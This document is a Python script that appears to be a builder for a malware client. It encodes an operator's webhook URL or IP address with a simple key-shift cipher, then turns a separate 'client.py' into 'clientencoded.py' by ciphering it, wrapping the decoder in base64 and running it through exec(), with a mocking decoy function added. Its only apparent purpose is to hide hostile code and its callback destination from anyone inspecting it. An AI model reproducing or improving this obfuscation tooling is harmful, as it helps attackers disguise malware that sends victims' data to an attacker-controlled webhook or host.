import requests
import uuid
#from Crypto.Cipher import AES
import base64
import hashlib

ip = requests.get('https://api.ipify.org').content.decode('utf8')

salt = input("[.] Encoding KEY (default : 0xSxZ^@@@!dazd0xSxZ) : ")
hashfile = input("[.] Hash the client.py? (don't forget to edit the variables before) (y/n): ")
if(salt == "" or salt == None):
	salt = "0xSxZ^@@@!dazd0xSxZ"

weborHost = input("[.] Encrypt webhook or host? (1/2) : ")
if(weborHost == "1"):
	webhook = input("[.] Webhook Url : ")
else:
	webhook = input(f"[.] Your IP (is it : {ip} ?) (y/n) : ")
if webhook == "n":
	host = input("[.] Enter you IP :")

def transcrireCle(cle):
	return "".join([str(ord(elt)) for elt in cle])


chiffre = []
hasher = ""
def chiffrer(cle, msg):
	cle = transcrireCle(cle)
	chiffre = []
	message = msg

	for elt in message:
		chiffre.append(ord(elt))


	for i in range(len(chiffre)):
		pos_cle = i % len(cle)
		chiffre[i] += int(cle[pos_cle])


	crypt = ""
	for elt in chiffre:
		try:
			crypt += chr(elt)
		except UnicodeEncodeError:
			crypt += "x"
	return chiffre
def Getchiffrer(cle, msg):
	cle = transcrireCle(cle)
	chiffre = []
	message = msg

	for elt in message:
		chiffre.append(ord(elt))


	for i in range(len(chiffre)):
		pos_cle = i % len(cle)
		chiffre[i] += int(cle[pos_cle])


	crypt = ""
	for elt in chiffre:
		try:
			crypt += chr(elt)
		except UnicodeEncodeError:
			crypt += "x"
	return crypt
chiffre = chiffrer(salt, webhook)
print("[.] Encoded : \n" + str(Getchiffrer(salt, webhook)))
print("\n\n[.] Chiffre : " + str(chiffre))


if hashfile == "y":
	chiffre = []
	fille = open("client.py", "r").read()
	chiffre = str(chiffrer("0xSxZ", fille))
	
	part2 = base64.b64encode(("""
def transcrireCle(cle):
	return "".join([str(ord(elt)) for elt in cle])

def dechiffrer():
	message = ""
	cle = transcrireCle(""" + '"' "0xSxZ"+ '"' +""")
	# parcours du tableau chiffre :
	chiffre = """ + str(chiffre)+"""
	for i in range(len(chiffre)):
		# on applique le chiffrement à l'envers
		chiffre[i] -= int(cle[i % len(cle)])
		# on retrouve le caractère avec chr()
		message += chr(chiffre[i])
	return message
print(dechiffrer())
exec(dechiffrer())
""").encode()).decode()


	fille = str('''import base64\nimport hashlib\nimport sys\nimport time\n

Made_By_0xSxZ = "''' + part2+""""\n\n"""+ """
def decryptMD5():
	print("Bahhahah you rly tought")


exec(base64.b64decode(Made_By_0xSxZ).decode())
""")
	open("clientencoded.py", "x").write(fille.replace("b'", "").replace("'", ""))
